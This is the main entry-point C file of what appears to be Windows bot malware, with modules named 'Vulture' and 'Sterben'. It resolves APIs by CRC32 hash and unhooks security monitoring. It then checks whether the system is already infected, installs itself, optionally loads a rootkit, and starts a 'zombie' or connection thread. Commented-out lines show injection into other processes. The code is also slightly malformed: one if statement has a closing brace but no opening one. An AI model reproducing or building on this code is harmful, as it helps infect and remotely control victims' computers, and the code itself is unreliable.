#include "bot_structs.h"
#include "api.h"
#include "mem.h"
#include "zombie.h"
#include "connection.h"
#include "install.h"
#include "os_info.h"
#include "inject.h"
#include "modules.h"
#include "string.h"

#include <stdio.h>

bot_t bot;

#ifdef MODULE_ROOTKIT
#include "rootkit.h"
#endif

int main()
{
	bot.crc.crc32Intalized = FALSE;

#ifdef DEBUG
	LPSTR pszShit = "NtCreateFile";

	DWORD dwHash = crc32Hash(pszShit, lstrlenA(pszShit));
	
	LPWSTR pwzShit = L"ws2_32.dll";
//	DWORD dwHash = crc32Hash(pwzShit, lstrlenW(pwzShit) * 2);
#endif
	
	//g_Bot.crc.crc32Intalized = FALSE;
	
	
	if (!InitializeAPI())
	{
#ifdef DEBUG
		printf("[EntryPoint]: Failed to dynamically allocate APIs\n");
#endif 
		return TRUE;
	}

	bot.hLocal = bot.api.pGetModuleHandleW(NULL);
 	bot.api.pGetModuleFileNameW(NULL, bot.wzBotPath, 255);

	UnhookProcess();
	
	if (!IsSystemInfected(&bot))
#ifdef DEBUG
		printf("[Main]:: %ls\n", bot.wzBotPath);
#endif
		InstallVulture(&bot);
		return FALSE;
	}
	

#ifdef DEBUG
#ifdef MODULE_ROOTKIT
	InstallRootkit();
#endif
#endif

#ifdef DEBUG
	printf("[Sterben]: New installation at %s\n", bot.api.wzBotPath);
#endif

	//StartConnectionThread(&bot);
#ifdef DEBUG
	StartConnectionThread();
	while (1)
	{
		bot.api.pSleep(1000);
	}
#else
	CreateZombie();
#endif

	bot.api.pExitProcess(0);
// 	if (!CreateZombie(&bot))
// 	{
// 		MessageBox(0, 0, 0, 0);
// 	}

// 
// 	DWORD i = InjectBot((void*)VultureEntryPoint, (PBYTE)VultureEntryPointEnd - (PBYTE)VultureEntryPoint);
// 
// 	if (i > 0)
// 		MessageBox(0, "A process was infected!", 0, 0);
// 	else MessageBox(0, "No processes were infected!", 0, 0);
// 
// 	LPWSTR pwzExplorer = L"user32.dll";
// 	DWORD dwLength = StrLengthW(pwzExplorer) * 2;
// 
// 	DWORD dwHash = crc32Hash(pwzExplorer, dwLength);

	//CreateZombie();

// 	while (!CreateZombie())
// 		CWA(Sleep)(1000);

// 	if (!CreateZombie())
// 	{
		//MessageBox(0, "Zombie failed.", 0, 0);
/*	}*/
// 
// 	LPSTR pwzGetWindowsDirectoryW = "GetSystemDirectoryW";
// 	DWORD dwHash = crc32Hash(pwzGetWindowsDirectoryW, StrLengthA(pwzGetWindowsDirectoryW));
// 	
// 	BOOL bIs64 = IsOperatingSystem64Bit();


	//LPWSTR pwz = GetSystem32Dir(&g_Bot);

	
	return FALSE;
}